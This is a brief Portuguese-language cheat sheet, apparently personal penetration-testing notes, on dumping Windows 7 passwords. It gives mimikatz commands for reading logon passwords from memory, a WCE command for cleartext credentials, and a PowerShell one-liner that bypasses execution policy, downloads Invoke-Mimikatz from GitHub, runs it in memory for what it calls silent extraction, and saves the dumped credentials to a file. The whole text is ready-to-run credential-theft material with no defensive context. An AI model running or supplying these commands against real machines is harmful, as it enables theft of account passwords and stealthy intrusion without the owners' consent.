### Obter senha do Windows 7 (mimikatz)
~~~~
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
~~~~

### Obter senha do Windows 7 (WCE)
~~~
wce.exe -w
~~~

Uso do Mimikatz de dentro da PowerShell diretamente na memória para fazer uma extração silenciosa
~~~
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" > C:\Users\maicon\Downloads\pass.txt
~~~
